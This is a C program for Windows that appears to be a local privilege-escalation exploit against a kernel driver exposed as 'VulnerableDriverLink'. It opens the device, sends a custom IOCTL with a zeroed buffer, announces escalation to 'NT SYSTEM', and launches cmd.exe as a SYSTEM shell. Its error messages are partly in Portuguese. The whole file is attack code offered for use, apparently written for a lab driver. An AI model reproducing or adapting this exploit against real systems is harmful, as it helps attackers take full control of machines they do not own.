#include <windows.h>
#include <stdio.h>

#define IOCTL_VULNERABLE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main() {
    HANDLE hDevice;
    BOOL result;
    DWORD bytesReturned;
    char inputBuffer[128] = { 0 }; // Buffer Input 
    char outputBuffer[128] = { 0 }; // Buffer output 

    // Open Device
    hDevice = CreateFileW(
        L"\\\\.\\VulnerableDriverLink",  
        GENERIC_READ | GENERIC_WRITE,  
        0,  
        NULL,  
        OPEN_EXISTING, // Open Device Existing 
        0,  
        NULL  
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        printf("Erro ao abrir o dispositivo: %lu\n", error);
        if (error == ERROR_ACCESS_DENIED) {
            printf("Permissões insuficientes. Execute como administrador\n");
        }
        else if (error == ERROR_FILE_NOT_FOUND) {
            printf("O driver não está carregado ou o link simbólico não existe\n");
        }
        return 1;
    }

    printf("Dispositivo aberto com sucesso.\n");

    // Send IOCTL_VULNERABLE for driver
    result = DeviceIoControl(
        hDevice,
        IOCTL_VULNERABLE,
        inputBuffer, sizeof(inputBuffer),  // Buffer Input
        outputBuffer, sizeof(outputBuffer), // Buffer Output
        &bytesReturned,
        NULL
    );

    if (!result) {
        DWORD error = GetLastError();
        printf("Error send IOCTL: %lu\n", error);
        switch (error) {
        case ERROR_ACCESS_DENIED:
            printf("No permission, run with Admin\n");
            break;
        case ERROR_INVALID_PARAMETER:
            printf("Incorrect Paramets send to IOCTL\n");
            break;
        case ERROR_FILE_NOT_FOUND:
            printf("The device not found\n");
            break;
        default:
            printf("Error error error.\n");
        }
        CloseHandle(hDevice);
        return 1;
    }

    printf("Send IOCTL Sucess!! PrivEsc to NT SYSTEM\n");

    printf("Open Shell SYSTEM\n");
    system("cmd.exe");

    CloseHandle(hDevice);

    return 0;
}
